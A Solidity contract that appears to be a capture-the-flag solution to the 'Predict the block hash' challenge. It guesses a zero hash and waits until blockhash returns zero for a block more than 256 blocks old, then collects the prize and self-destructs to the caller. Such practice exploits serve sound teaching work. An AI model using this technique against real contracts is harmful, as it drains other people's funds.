pragma solidity ^0.4.21;

import "./PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashSolver {
    PredictTheBlockHashChallenge public challenge;
    uint256 public settlementBlockNumber;

    function PredictTheBlockHashSolver(address _challenge) public payable {
        require(msg.value == 1 ether);
        challenge = PredictTheBlockHashChallenge(_challenge);
        challenge.lockInGuess.value(1 ether)(bytes32(0));
        settlementBlockNumber = block.number + 1;
    }

    function() public payable {}

    function settle() public {
        require(block.blockhash(settlementBlockNumber) == bytes32(0));
        challenge.settle();
        require(challenge.isComplete());
        require(address(this).balance >= 2 ether);
        selfdestruct(msg.sender);
    }

}
